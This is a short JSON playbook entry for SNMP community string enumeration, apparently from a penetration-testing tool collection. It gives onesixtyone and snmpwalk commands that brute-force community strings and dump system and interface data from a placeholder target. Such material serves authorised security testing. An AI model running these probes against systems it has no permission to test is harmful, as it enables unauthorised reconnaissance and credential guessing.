@@ -1,0 +1,25 @@
+{
+	"name": "SNMP Community String Enumeration",
+	"description": "Extract system info using default or guessed communities.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Brute Communities",
+			"command": "onesixtyone -c communities.txt target.com",
+			"description": "Fast community guessing."
+		},
+		{
+			"index": 2,
+			"name": "SNMPWalk",
+			"command": "snmpwalk -v2c -c public target.com system",
+			"description": "Dump system tree."
+		},
+		{
+			"index": 3,
+			"name": "Interface Info",
+			"command": "snmpwalk -v2c -c public target.com ifDescr",
+			"description": "List network interfaces."
+		}
+	]
+}
